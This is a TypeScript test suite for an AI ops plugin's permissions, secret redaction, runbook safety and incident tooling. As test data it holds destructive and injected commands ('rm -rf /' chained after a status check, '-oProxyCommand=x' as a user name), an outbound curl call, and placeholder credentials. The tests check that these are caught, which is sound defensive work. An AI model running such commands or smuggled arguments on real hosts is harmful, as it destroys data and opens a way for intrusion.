  const calls: string[] = [];
  const vault = { reveal: async (n: string, purpose: string) => { calls.push(`${n} for ${purpose}`); return 'hunter2-from-vault'; }, list: async () => [{ name: 'ops-a', kind: 'password' }, { name: 'other', kind: 'password' }] };
  const seen = new Set<string>();
  const v = await secrets.revealCredential('ops-a', { services: { vault }, secret: () => undefined, patterns: ['ops-*'], purpose: 'aiops: ssh to a', seen });
  assert.equal(v, 'hunter2-from-vault');
  assert.deepEqual(calls, ['ops-a for aiops: ssh to a']);
  await assert.rejects(secrets.revealCredential('prod-db', { services: { vault }, secret: () => undefined, patterns: ['ops-*'] }), /outside what the aiops plugin may read/);
  assert.deepEqual((await secrets.listCredentials({ vault }, ['ops-*'])).map((e: { name: string }) => e.name), ['ops-a']);
  // No vault: the operator's declared secret, inline JSON or @file.
  await assert.rejects(secrets.revealCredential('ops-a', { secret: () => undefined, patterns: ['ops-*'] }), /no Key Vault.*HARNESS_OPS_SECRETS/);
  assert.equal(await secrets.revealCredential('ops-a', { secret: () => '{"ops-a":"pw1"}', patterns: ['ops-*'] }), 'pw1');
  const f = path.join(await tempDir(), 's.json');
  await fs.writeFile(f, '{"ops-b":"pw2"}');
  assert.equal(await secrets.revealCredential('ops-b', { secret: () => `@${f}`, patterns: ['ops-*'] }), 'pw2');
  await assert.rejects(secrets.revealCredential('ops-c', { secret: () => `@${f}`, patterns: ['ops-*'] }), /not in HARNESS_OPS_SECRETS/);
  const key = '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-----END OPENSSH PRIVATE KEY-----';
  const out = secrets.redact(`pw is hunter2-from-vault\n${key}\nDB_PASSWORD=s3cr3tvalue export API_TOKEN: abcdefgh\nghp_${'a'.repeat(36)}`, seen);
  assert.doesNotMatch(out, /hunter2|s3cr3tvalue|abcdefgh|BEGIN OPENSSH|ghp_a/);
  assert.match(out, /DB_PASSWORD=\[REDACTED\]/);
});

test('aiops host stats: the script\'s output parsed (CPU from two samples, memory, disks nearly full, failed units, OOM)', () => {
  const out = ['@@UNAME', 'Linux 6.1 x86_64', '@@UPTIME', '90000.5 1', '@@LOAD', '3.00 2.00 1.00 1/100 5', '@@NPROC', '2', '@@STAT1', 'cpu  100 0 100 800 0 0 0 0', '@@STAT2', 'cpu  150 0 150 900 0 0 0 0', '@@MEM', 'MemTotal: 1000000 kB', 'MemFree: 100000 kB', 'MemAvailable: 250000 kB', 'SwapTotal: 0 kB', 'SwapFree: 0 kB', '@@DF', 'Filesystem 1024-blocks Used Available Capacity Mounted on', '/dev/sda1 1000000 950000 50000 95% /', 'tmpfs 65536 64000 1536 98% /data', 'tmpfs 1000 0 1000 0% /dev/shm', '@@DFI', '@@PS', '  PID USER %CPU %MEM RSS COMMAND', '  1 root 50 1 100 node', '@@PSMEM', '@@FAILED', 'nginx.service loaded failed failed nginx', '@@KERN', 'Out of memory: Killed process 123 (node)', '@@END'].join('\n');
  const p = hoststats.parseHostStats(out);
  assert.equal(p.cpuPct, 50);
  assert.equal(p.memUsedPct, 75);
  assert.deepEqual(p.disks.map((d: { mount: string; usedPct: number }) => `${d.mount}:${d.usedPct}`), ['/data:98', '/:95']);
  assert.match(p.text, /load 3 2 1 \(per CPU 1.50 - SATURATED\)/);
  assert.match(p.text, /\/data \(tmpfs\): 98% used.*NEARLY FULL/);
  assert.deepEqual(p.failed, ['nginx.service loaded failed failed nginx']);
  assert.match(p.text, /Killed process 123/);
  const du = hoststats.parseDu('@@DU\n60000\t/data/cache\n2048\t/data/app\n@@BIG\n-rw-r--r-- 1 root root 20000000 Oct 1 x /data/cache/big.tmp\n@@END');
  assert.equal(du.du[0].path, '/data/cache');
  assert.match(du.text, /59 MiB\s+\/data\/cache/);
});

// ---------------- runbooks ----------------

test('aiops runbook-safe: the skill\'s example passes; a change without approval, verify, command or rollback fails', async () => {
  const skill = await fs.readFile(path.join(PLUGIN, 'skills', 'runbook-writing', 'SKILL.md'), 'utf8');
  const example = /```markdown\n([\s\S]*?)\n```\s*$/.exec(skill)![1]!;
  const good = runbooks.checkRunbook(example, 'example.md');
  assert.deepEqual(good.errors, []);
  assert.ok(good.steps.some((s: { tag: string }) => s.tag === 'change'));
  const bad = runbooks.checkRunbook(`# Runbook: x\n## Steps\n1. [check] look\n2. [change] restart it\n3. [approval] ok?\n4. [change] \`rm -rf /tmp/a\`\n5. [change] \`rm b\`\n6. untagged\n## Rollback\n`, 'bad.md');
  const e = bad.errors.join('\n');
  assert.match(e, /step 2 \[change\] has no \[approval\]/);
  assert.match(e, /step 2 \[change\] needs the exact command/);
  assert.match(e, /step 2 \[change\] is not verified before step 4/);
  assert.match(e, /step 5 \[change\] has no \[approval\] step before it since the previous change/);
  assert.match(e, /step 5 \[change\] is the last change and nothing verifies it/);
  assert.match(e, /step 6 has no tag/);
  assert.match(e, /Rollback.*missing or empty/);
});

test('aiops workflows: every built-in workflow is valid; every runbook and incident-response approves each change and verifies it', async () => {
  const dir = path.join(PLUGIN, 'workflows');
  const names = (await fs.readdir(dir)).filter((n) => n.endsWith('.json'));
  assert.ok(names.length >= 9);
  for (const n of names) {
    const w = JSON.parse(await fs.readFile(path.join(dir, n), 'utf8'));
    assert.deepEqual(validateWorkflow(w), [], n);
    const s = runbooks.checkWorkflowSafety(w);
    assert.deepEqual(s.errors, [], n);
    if (n.startsWith('runbook-') || n === 'incident-response.json') assert.ok(s.changes.length >= 1, `${n} marks its change step`);
    else assert.equal(s.changes.length, 0, `${n} is read-only`);
  }
  // An unsafe one: a change reachable without approval, a change approved on reject, and no verify before the end.
  const bad = runbooks.checkWorkflowSafety({ name: 'bad', start: 'a', nodes: {
    a: { type: 'agent', prompt: 'x', next: 'ap' },
    ap: { type: 'approval', message: 'm', next: { on: { approve: 'fix', reject: 'fix2' } } },
    fix: { type: 'agent', prompt: 'x', change: true, next: 'check' },
    check: { type: 'gate', gates: ['ops-healthy'], next: { on: { pass: 'done', fail: 'fix3' } } },
    fix3: { type: 'agent', prompt: 'x', change: true, next: 'done' },
    fix2: { type: 'agent', prompt: 'x', change: true, next: 'done' },
    done: { type: 'end' },
  } });
  const e = bad.errors.join('\n');
  assert.match(e, /"fix2" can run without passing an approval/);
  assert.match(e, /"fix3" follows change step "fix"/);
  assert.match(e, /after change step "fix3" the run can reach "done" without a verify step/);
});

test('aiops incidents: open, timeline, resolve and a blameless postmortem with a root cause line', () => {
  const t = Date.parse('2026-10-21T10:00:00Z');
  const inc = incidents.openIncident({ title: 'Slow /api/orders', severity: 'sev2', services: ['shop-api'] }, t);
  assert.equal(inc.id, 'inc-20261021-slow-api-orders');
  assert.equal(incidents.openIncident({ title: 'Slow /api/orders' }, t, [inc.id]).id, 'inc-20261021-slow-api-orders-2');
  incidents.updateIncident(inc, { note: 'p95 2.1 s on /api/orders', kind: 'evidence', at: '2026-10-21T09:58:00Z' }, t + 60e3);
  incidents.updateIncident(inc, { status: 'identified' }, t + 120e3);
  assert.throws(() => incidents.updateIncident(inc, { status: 'fixed' }), /status must be one of/);
  assert.equal(inc.timeline[0].kind, 'evidence', 'the timeline is in time order');
  assert.throws(() => incidents.resolveIncident(inc, {}), /root_cause/);
  incidents.resolveIncident(inc, { root_cause: 'migration 0042 dropped the orders_customer_id_idx index', resolution: 'index recreated' }, t + 30 * 60e3);
  const md = incidents.renderPostmortem(inc, { impact: ['orders p95 2 s for 30 min'], action_items: [{ action: 'recreate indexes in migrations', type: 'prevent', owner: 'db team', priority: 'P1' }] });
  assert.match(md, /^Root cause: migration 0042 dropped the orders_customer_id_idx index$/m);
  assert.match(md, /\| recreate indexes in migrations \| prevent \| db team \| P1 \| - \|/);
  assert.match(md, /Blameless/);
  assert.match(incidents.renderIncident(inc), /Resolved: 2026-10-21T10:30:00Z \(30 min\)/);
});

// ---------------- the plugin in a harness ----------------

async function workspace(inv: unknown = GOOD) {
  const ws = await tempDir();
  await fs.mkdir(path.join(ws, '.harness', 'ops'), { recursive: true });
  await fs.writeFile(path.join(ws, '.harness', 'ops', 'inventory.json'), JSON.stringify(inv));
  return ws;
}

async function harness() {
  const dataDir = await tempDir();
  const h = await createHarness({ dataDir, plugins: [PLUGIN], search: null, memory: 'off', scheduler: false });
  return { h, dataDir, tool: (n: string) => h.registry.tools.get(n)! };
}

test('aiops plugin: tools with the right permission class, only in sessions with an inventory; agents, skills, workflows and gates', async () => {
  const { h, tool } = await harness();
  try {
    const kinds = Object.fromEntries(['ops_inventory', 'prometheus_query', 'logs_search', 'probe', 'host_stats', 'docker_status', 'ssh_exec', 'service_control', 'ops_check', 'slo_status', 'capacity_forecast', 'incident', 'runbook'].map((n) => [n, tool(n)?.kind]));
    assert.deepEqual(kinds, { ops_inventory: 'read', prometheus_query: 'network', logs_search: 'network', probe: 'network', host_stats: 'network', docker_status: 'read', ssh_exec: 'external', service_control: 'external', ops_check: 'network', slo_status: 'network', capacity_forecast: 'network', incident: 'edit', runbook: 'read' });
    for (const n of ['prometheus_query', 'logs_search', 'probe', 'ssh_exec', 'docker_status', 'host_stats']) assert.equal(tool(n).untrusted, true, `${n} output is untrusted`);
    const sshOut = tool('ssh_exec').sendsOut as (i: Record<string, unknown>) => boolean;
    assert.equal(sshOut({ host: 'db-1', command: 'uptime' }), true, 'without a read-only account every ssh_exec can send data out');
    assert.deepEqual(tool('host_stats').kindsFor!({ host: 'local' }), ['read']);
    assert.deepEqual(tool('host_stats').kindsFor!({ host: 'db-1' }), ['network']);
    assert.deepEqual(tool('service_control').kindsFor!({ action: 'status' }), ['network']);
    assert.deepEqual(tool('service_control').kindsFor!({ action: 'restart' }), ['external']);
    assert.match(tool('ssh_exec').summarize({ host: 'db-1', command: 'df -h' }), /\[read-only\]/);
    assert.match(tool('ssh_exec').summarize({ host: 'db-1', command: 'rm -rf /x' }), /\[CHANGE\]/);
    // Without an inventory the tools stay out of the session (they would only fail, and cost prompt tokens).
    const empty = new LocalHost(await tempDir());
    assert.equal(await tool('prometheus_query').availableIn!(empty), false);
    assert.equal(await tool('prometheus_query').availableIn!(new LocalHost(await workspace())), true);
    for (const a of ['sre', 'capacity-planner', 'security-auditor', 'cost-optimizer']) assert.ok(h.registry.agents.get(a), a);
    assert.deepEqual(h.registry.agents.get('security-auditor')!.tools!.includes('service_control'), false, 'the auditor cannot change services');
    for (const w of ['incident-response', 'ops-advisor', 'ops-watch', 'runbook-restart-service', 'runbook-clear-disk', 'runbook-rotate-logs', 'runbook-os-updates', 'runbook-cert-check', 'runbook-backup-verify']) assert.ok(h.registry.workflows.get(w), w);
    for (const g of ['inventory-valid', 'alerts-valid', 'runbook-safe', 'ops-healthy']) assert.ok(h.registry.gates.get(g), g);
    const skills = h.registry.skillDirs.find((d) => d.source === 'aiops')!;
    for (const s of ['aiops-triage', 'promql', 'runbook-writing', 'postmortem', 'ops-inventory']) await fs.access(path.join(skills.dir, s, 'SKILL.md'));
    // Every tool an agent names exists.
    const names = new Set([...h.registry.tools.keys(), 'skill', 'agent']);
    for (const a of ['sre', 'capacity-planner', 'security-auditor', 'cost-optimizer']) for (const t of h.registry.agents.get(a)!.tools ?? []) assert.ok(names.has(t), `${a}: ${t}`);
  } finally { await h.close(); }
});

test('aiops permissions: ssh_exec is asked unless an operator rule names that host and command; a compound command is never covered; dontAsk refuses', async () => {
  const { h, tool } = await harness();
  try {
    const t = tool('ssh_exec') as Tool;
    const rules = (allow: string[] = [], operatorAllow: string[] = []): Rules => ({ allow: [...allow, ...operatorAllow], deny: [], ask: [], operatorAllow });
    const call = { host: 'db-1', command: 'systemctl status nginx' };
    assert.equal(decide(t, call, { mode: 'default', rules: rules(), sandboxed: true }).action, 'ask');
    assert.equal(decide(t, call, { mode: 'acceptEdits', rules: rules(), sandboxed: true }).action, 'ask');
    assert.equal(decide(t, call, { mode: 'dontAsk', rules: rules(), sandboxed: true }).action, 'deny');
    assert.equal(decide(t, call, { mode: 'plan', rules: rules(), sandboxed: true }).action, 'deny');
    const op = rules([], ['ssh_exec(db-1 systemctl status:*)']);
    assert.equal(decide(t, call, { mode: 'dontAsk', rules: op, sandboxed: true, tainted: true }).action, 'allow', 'an operator rule holds even after untrusted output');
    assert.equal(decide(t, { host: 'db-2', command: 'systemctl status nginx' }, { mode: 'default', rules: op, sandboxed: true }).action, 'ask', 'another host');
    assert.equal(decide(t, { host: 'db-1', command: 'systemctl status nginx; rm -rf /' }, { mode: 'default', rules: op, sandboxed: true }).action, 'ask', 'compound');
    assert.equal(decide(t, { host: 'db-1', command: 'systemctl restart nginx' }, { mode: 'default', rules: op, sandboxed: true }).action, 'ask');
    // A repository's allow rule never covers it (it leaves the sandbox).
    const project: Rules = { allow: ['ssh_exec'], deny: [], ask: [], projectAllow: ['ssh_exec'] };
    assert.equal(decide(t, call, { mode: 'default', rules: project, sandboxed: true }).action, 'ask');
    // "Always allow" suggests exactly this host and command, not the tool.
    const { suggestRule } = await import('../src/core/permissions.ts');
    assert.equal(suggestRule(t, call), 'ssh_exec(db-1 systemctl status nginx)');
    // Re-pinning a host key is never covered by a rule for the command (exact or prefix): it is always asked.
    const exact = rules([], ['ssh_exec(db-1 uptime)', 'ssh_exec(db-1:*)']);
    assert.equal(decide(t, { host: 'db-1', command: 'uptime' }, { mode: 'default', rules: exact, sandboxed: true }).action, 'allow');
    assert.equal(decide(t, { host: 'db-1', command: 'uptime', trust_host_key: 'SHA256:abc' }, { mode: 'default', rules: exact, sandboxed: true }).action, 'ask');
    assert.equal(decide(t, { host: 'db-1', command: 'uptime', trust_host_key: 'SHA256:abc' }, { mode: 'dontAsk', rules: exact, sandboxed: true }).action, 'deny');
    assert.match(t.summarize({ host: 'db-1', command: 'uptime', trust_host_key: 'SHA256:abc' }), /^RE-PIN the host key of db-1 to SHA256:abc/);
  } finally { await h.close(); }
});

test('aiops least privilege: a host\'s read-only account investigates unasked (any command); the operator account is asked; only the operator\'s inventory can declare a reader', async () => {
  const { h, tool } = await harness();
  const opFile = path.join(await tempDir(), 'ops.json');
  await fs.writeFile(opFile, JSON.stringify({ hosts: [
    { name: 'db-1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-db-1-key', readUser: 'reader', readCredential: 'ops-db-1-reader-key', env: 'prod' },
    { name: 'web-1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-web-1-key' },
  ] }));
  process.env.HARNESS_OPS_INVENTORY = opFile;
  try {
    const t = tool('ssh_exec') as Tool;
    const rules = (operatorAllow: string[] = []): Rules => ({ allow: [...operatorAllow], deny: [], ask: [], operatorAllow });
    const vaultOk = rules(['vault(ops-*)']);
    const investigate = { host: 'db-1', command: 'for p in /proc/[0-9]*; do ls -l $p/fd 2>/dev/null | grep -c /data; done; command -v dbctl; echo $?' };
    assert.equal(ssh.isReadOnly(investigate.command), false, 'by its syntax alone it would be asked as a change');
    assert.deepEqual(t.vaultNames!(investigate), ['ops-db-1-reader-key']);
    assert.deepEqual(t.kindsFor!(investigate), ['read']);
    assert.equal(decide(t, investigate, { mode: 'default', rules: vaultOk, sandboxed: true }).action, 'allow');
    assert.equal(decide(t, investigate, { mode: 'default', rules: vaultOk, sandboxed: true, tainted: true }).action, 'allow', 'after untrusted output too: the host refuses its changes');
    assert.equal(decide(t, investigate, { mode: 'dontAsk', rules: vaultOk, sandboxed: true }).action, 'allow');
    assert.equal(decide(t, investigate, { mode: 'plan', rules: vaultOk, sandboxed: true }).action, 'allow');
    // Its credential is still decided by the vault rules.
    assert.equal(decide(t, investigate, { mode: 'default', rules: rules(), sandboxed: true }).action, 'ask');
    assert.equal(decide(t, investigate, { mode: 'default', rules: { ...vaultOk, deny: ['vault(ops-db-1-reader-key)'] }, sandboxed: true }).action, 'deny');
    // A reader command naming a network client is confirmed after untrusted content (a way out from the host).
    const out = { host: 'db-1', command: 'curl -s http://example.com/x' };
    assert.equal(decide(t, out, { mode: 'default', rules: vaultOk, sandboxed: true }).action, 'allow');
    assert.equal(decide(t, out, { mode: 'default', rules: vaultOk, sandboxed: true, tainted: true }).action, 'ask');
    // The operator account: its own credential, asked, refused where nobody is asked.
    const change = { host: 'db-1', as: 'operator', command: 'sh /data/app/bin/dbctl create-index x' };
    assert.deepEqual(t.vaultNames!(change), ['ops-db-1-key']);
    assert.deepEqual(t.kindsFor!(change), ['external']);
    assert.equal(decide(t, change, { mode: 'default', rules: vaultOk, sandboxed: true }).action, 'ask');
    assert.equal(decide(t, change, { mode: 'dontAsk', rules: vaultOk, sandboxed: true }).action, 'deny');
    assert.match(t.summarize(change), /^ssh db-1 as operator \[CHANGE\]/);
    assert.match(t.summarize(investigate), /^ssh db-1 as reader: for p/);
    // A host key re-pin changes what the harness trusts: asked even as the reader.
    assert.equal(decide(t, { ...investigate, trust_host_key: 'SHA256:x' }, { mode: 'default', rules: vaultOk, sandboxed: true }).action, 'ask');
    // A host without a reader: the operator account, asked.
    const web = { host: 'web-1', command: 'uptime' };
    assert.deepEqual(t.vaultNames!(web), ['ops-web-1-key']);
    assert.equal(decide(t, web, { mode: 'default', rules: vaultOk, sandboxed: true }).action, 'ask');
    const r0 = await t.run({ host: 'web-1', as: 'reader', command: 'uptime' }, ctxFor(await workspace({ services: [] })));
    assert.match(r0.content, /no read-only account .*nothing ran/);
    // host_stats (a fixed script) as the reader: a read.
    assert.deepEqual(tool('host_stats').kindsFor!({ host: 'db-1' }), ['read']);
    assert.deepEqual(tool('host_stats').vaultNames!({ host: 'db-1' }), ['ops-db-1-reader-key']);
    assert.deepEqual(tool('host_stats').kindsFor!({ host: 'web-1' }), ['network']);

    // A workspace inventory cannot declare a reader: ignored with a warning, and the call stays an operator call.
    await fs.writeFile(opFile, JSON.stringify({ hosts: [{ name: 'db-1', address: '127.0.0.1', port: 9, user: 'ops', credential: 'ops-db-1-key', env: 'prod' }] }));
    const ws = await workspace({ hosts: [{ name: 'db-1', address: '127.0.0.1', user: 'ops', readUser: 'reader', readCredential: 'ops-db-1-key' }], services: [] });
    const resolve = async (_h: unknown, rel: string) => path.join(ws, rel);
    const merged = await inventory.loadInventory({ host: new LocalHost(ws), resolve, env: { HARNESS_OPS_INVENTORY: opFile } });
    assert.equal(merged.hosts[0].readUser, undefined);
    const alone = await inventory.loadInventory({ host: new LocalHost(ws), resolve, env: {} });
    assert.equal(alone.hosts[0].readUser, undefined);
    assert.match(alone.warnings.join('\n'), /read-only account \(readUser, readCredential\) is ignored: only the operator's inventory/);
    assert.deepEqual(t.kindsFor!(investigate), ['external']);
    assert.deepEqual(t.vaultNames!(investigate), ['ops-db-1-key']);
    assert.equal(decide(t, investigate, { mode: 'default', rules: vaultOk, sandboxed: true }).action, 'ask');
    // The operator's reader fields are checked like the rest.
    const bad = inventory.validateInventory({ hosts: [{ name: 'a', user: 'ops', credential: 'ops-a', readUser: '-oProxyCommand=x', readCredential: 'ops-a-r' }, { name: 'b', readUser: 'r' }, { name: 'c', user: 'ops', credential: 'ops-c', readUser: 'ops', readCredential: 'ops-c-r' }, { name: 'd', readUser: 'r', readCredential: 'prod-root' }] }, { source: 'operator' });
    const errs = bad.errors.join('\n');
    assert.match(errs, /readUser "-oProxyCommand=x" is not a valid user name/);
    assert.match(errs, /needs both readUser and readCredential/);
    assert.match(errs, /readCredential "prod-root" is outside/);
    assert.match(bad.warnings.join('\n'), /readUser "ops" is the operator account itself/);
    assert.equal(bad.inv.hosts.find((x: { name: string }) => x.name === 'c').readUser, undefined);
  } finally { delete process.env.HARNESS_OPS_INVENTORY; await h.close(); }
});

test('aiops tools against a fake Prometheus: inventory, queries, alert evaluation (for, probes, maintenance), SLO burn, forecasts, gates', async () => {
  let firing = true;
  const p = await fakePrometheus((q, kind) => {
    if (kind === 'query_range') {
      const pts = Array.from({ length: 40 }, (_, i) => [1_000_000 + i * 60, String(50 + i)]);
      if (q.startsWith('disk_used')) return { status: 'success', data: { resultType: 'matrix', result: [{ metric: { mountpoint: '/' }, values: pts }] } };
      if (q.includes('== 0')) return { status: 'success', data: { resultType: 'matrix', result: firing ? [{ metric: { job: 'api' }, values: Array.from({ length: 12 }, (_, i) => [i * 6, '0']) }] : [] } };
      return { status: 'success', data: { resultType: 'matrix', result: [] } };
    }
    if (q.includes('sum(rate(e[')) return { status: 'success', data: { resultType: 'vector', result: [{ metric: {}, value: [0, q.includes('[5m]') || q.includes('[1h]') ? '0.02' : '0.0005'] }] } };
    if (q === 'sum(rate(t[1h]))' || q.startsWith('(sum(rate(e')) return { status: 'success', data: { resultType: 'vector', result: [{ metric: {}, value: [0, q.includes('[5m]') || q.includes('[1h]') ? '0.02' : '0.0005'] }] } };
    if (q.startsWith('bad(')) return { status: 'error', errorType: 'bad_data', error: 'unexpected end of input' };
    return { status: 'success', data: { resultType: 'vector', result: [{ metric: { __name__: 'up', job: 'api' }, value: [0, '1'] }] } };
  });
  const health = http.createServer((_q, r) => { r.writeHead(503); r.end('down'); });
  await new Promise<void>((r) => health.listen(0, '127.0.0.1', () => r()));
  const healthUrl = `http://127.0.0.1:${(health.address() as { port: number }).port}/health`;
  const inv = { ...GOOD, monitoring: { prometheus: p.url }, services: [{ ...GOOD.services[0], health: healthUrl }], alerts: [GOOD.alerts[0]], maintenance: [] };
  const ws = await workspace(inv);
  const { h, tool, dataDir } = await harness();
  try {
    const ctx = ctxFor(ws);
    const list = await tool('ops_inventory').run({ action: 'list' }, ctx);
    // A workspace inventory names hosts, never the credentials to send them.
    assert.match(list.content, /db-1: ops@10.0.0.5:22 env=prod tags=db credential=\(none\) \[workspace\]/);
    assert.match(list.content, /api: host=db-1/);
    const val = await tool('ops_inventory').run({ action: 'validate' }, ctx);
    assert.equal(val.is_error, false, val.content);
    assert.match(val.content, /no Key Vault/);
    assert.match(val.content, /credential "ops-db-1-key" is ignored: only the operator's inventory/);

    const q = await tool('prometheus_query').run({ query: 'up' }, ctx);
    assert.match(q.content, /instant query .*1 series\nup\{job="api"\} = 1/);
    const bad = await tool('prometheus_query').run({ query: 'sum(rate(x[5m])' }, ctx);
    assert.equal(bad.is_error, true);
    assert.match(bad.content, /malformed: unclosed/);
    const range = await tool('prometheus_query').run({ query: 'disk_used', start: 'now-2h', step: '1s' }, ctx);
    assert.match(range.content, /step \d+s \(raised from 1s/);

    // The PromQL rule fires (true for its whole "for"), the implicit health probe fires; outside maintenance.
    const chk = await tool('ops_check').run({}, ctx);
    assert.match(chk.content, /2 rule\(s\): 2 firing/);
    assert.match(chk.content, /FIRING  \[critical\] ApiDown \(api\): true for 1m/);
    assert.match(chk.content, /FIRING  \[critical\] api:health \(api\) \(implicit\): .*HTTP 503/);
    firing = false;
    const chk2 = await tool('ops_check').run({ include_ok: true }, ctx);
    assert.match(chk2.content, /OK      \[critical\] ApiDown/);
    const hist = await tool('ops_check').run({ action: 'history' }, ctx);
    assert.match(hist.content, /ApiDown: 1 change\(s\), firing in 1\/2 run\(s\)/);
    await fs.access(path.join(dataDir, 'plugin-data', 'aiops', 'alert-history.jsonl'));

    const slo = await tool('slo_status').run({}, ctx);
    assert.match(slo.content, /api\/avail: objective 99.9% over 30d/);
    assert.match(slo.content, /FIRING critical 14.4x over 1h and 5m/);

    const fc = await tool('capacity_forecast').run({ query: 'disk_used', range: '1d', threshold: 100 }, ctx);
    assert.match(fc.content, /linear: 1440\/day, r² 1, .*reaches 100: 1\dm/);

    // Gates: the inventory is valid. A gate sends nothing to a Prometheus the workspace named (no one is asked there).
    const before = p.seen.length;
    const gates = await runGates(h.registry, new LocalHost(ws), ['inventory-valid', 'alerts-valid'], new AbortController().signal);
    assert.deepEqual(gates.map((g) => g.pass), [true, true], JSON.stringify(gates));
    assert.match(gates[1]!.summary, /0 parsed by Prometheus \(the Prometheus parse check runs only against the operator's Prometheus/);
    assert.equal(p.seen.length, before, 'the gate made no request to the workspace\'s Prometheus');
    // The operator's Prometheus parses them; an alert it cannot parse fails alerts-valid.
    const opFile = path.join(await tempDir(), 'ops.json');
    await fs.writeFile(opFile, JSON.stringify({ monitoring: { prometheus: p.url } }));
    process.env.HARNESS_OPS_INVENTORY = opFile;
    try {
      const og = await runGates(h.registry, new LocalHost(ws), ['alerts-valid'], new AbortController().signal);
      assert.equal(og[0]!.pass, true, JSON.stringify(og));
      assert.match(og[0]!.summary, /1 parsed by Prometheus/);
      const ws2 = await workspace({ ...inv, alerts: [{ name: 'Broken', expr: 'bad()' }] });
      const g2 = await runGates(h.registry, new LocalHost(ws2), ['alerts-valid'], new AbortController().signal);
      assert.equal(g2[0]!.pass, false);
      assert.match(g2[0]!.details!, /alerts.Broken: Prometheus does not parse it/);
    } finally { delete process.env.HARNESS_OPS_INVENTORY; }
    // ops-healthy: the critical health probe fails it; it never runs unless named.
    const g3 = await runGates(h.registry, new LocalHost(ws), ['ops-healthy'], new AbortController().signal);
    assert.equal(g3[0]!.pass, false);
    assert.match(g3[0]!.details!, /api:health/);
    const applicable = await runGates(h.registry, new LocalHost(ws), 'applicable', new AbortController().signal);
    assert.ok(!applicable.some((g) => g.name === 'ops-healthy'));
  } finally { await h.close(); await p.close(); health.close(); }
});

test('aiops incident and runbook tools write and check files in the workspace; the runbook-safe gate judges workspace runbooks', async () => {
  const ws = await workspace();
  const { h, tool } = await harness();
  try {
    const ctx = ctxFor(ws);
    const o = await tool('incident').run({ action: 'open', title: 'Orders slow', severity: 'sev2', services: ['api'] }, ctx);
    const id = /Opened (inc-[a-z0-9-]+)/.exec(o.content)![1]!;
    await tool('incident').run({ action: 'update', id, note: 'p95 2s', kind: 'evidence' }, ctx);
    await tool('incident').run({ action: 'resolve', id, root_cause: 'missing index on orders', resolution: 'created it' }, ctx);
    const pm = await tool('incident').run({ action: 'postmortem', id, impact: ['30 min slow'], action_items: [{ action: 'check indexes after migrations', type: 'prevent' }] }, ctx);
    assert.match(pm.content, /postmortem.md/);
    const md = await fs.readFile(path.join(ws, '.harness', 'ops', 'incidents', id, 'postmortem.md'), 'utf8');
    assert.match(md, /^Root cause: missing index on orders$/m);
    assert.match((await tool('incident').run({ action: 'list' }, ctx)).content, new RegExp(`${id} \\[sev2, resolved\\]`));
    assert.equal((await tool('incident').run({ action: 'show', id: '../../etc' }, ctx)).is_error, true);

    const rbDir = path.join(ws, '.harness', 'ops', 'runbooks');
    await fs.mkdir(rbDir, { recursive: true });
    await fs.writeFile(path.join(rbDir, 'bad.md'), '# Runbook: bad\n## Steps\n1. [change] `rm -rf /tmp/x`\n## Rollback\nnone possible\n');
    const chk = await tool('runbook').run({ action: 'check', name: 'bad' }, ctx);
    assert.equal(chk.is_error, true);
    assert.match(chk.content, /no \[approval\]/);
    const list = await tool('runbook').run({ action: 'list' }, ctx);
    assert.match(list.content, /bad \(markdown/);
    assert.match(list.content, /runbook-clear-disk \(workflow \(built in\)/);
    let g = await runGates(h.registry, new LocalHost(ws), 'applicable', new AbortController().signal);
    assert.equal(g.find((x) => x.name === 'runbook-safe')!.pass, false);
    await fs.writeFile(path.join(rbDir, 'bad.md'), '# Runbook: bad\n## Steps\n1. [approval] ok\n2. [change] `rm -rf /tmp/x`\n3. [verify] `ls /tmp/x` fails\n## Rollback\nnone possible\n');
    g = await runGates(h.registry, new LocalHost(ws), ['runbook-safe'], new AbortController().signal);
    assert.equal(g[0]!.pass, true, g[0]!.details ?? '');
  } finally { await h.close(); }
});

test('aiops in an agent loop (FakeProvider): reads run, the model gets redacted untrusted output, and a change refused by the person never runs', async () => {
  const p = await fakePrometheus(() => ({ status: 'success', data: { resultType: 'vector', result: [{ metric: { job: 'api', password: 'hunter2hunter2' }, value: [0, '1'] }] } }));
  const ws = await workspace({ ...GOOD, monitoring: { prometheus: p.url } });
  const { h, dataDir } = await harness();
  try {
    const tools = [...h.registry.tools.values()];
    const a = await makeAgent([
      { calls: [{ name: 'prometheus_query', input: { query: 'up' } }] },
      { calls: [{ name: 'ssh_exec', input: { host: 'db-1', command: 'rm -rf /var/lib/app' } }] },
      { text: 'Stopped.' },
    ], { mode: 'default', tools, root: ws });
    a.permissionAnswers.push(true, false);
    a.agent.append({ role: 'user', content: [{ type: 'text', text: 'check the api' }] });
    await a.agent.run(new AbortController().signal);
    const res = a.agent.messages.filter((m) => m.role === 'user').flatMap((m) => results(m));
    assert.match(res[0]!.content, /\{job="api", password=\[REDACTED\]\} = 1/);
    assert.doesNotMatch(res[0]!.content, /hunter2/);
    assert.match(res[1]!.content, /denied.*no thanks/);
    // Nothing was run on the host: the audit log has no change.
    const audit = await fs.readFile(path.join(dataDir, 'plugin-data', 'aiops', 'audit.jsonl'), 'utf8').catch(() => '');
    assert.equal(audit, '');
  } finally { await h.close(); await p.close(); }
});
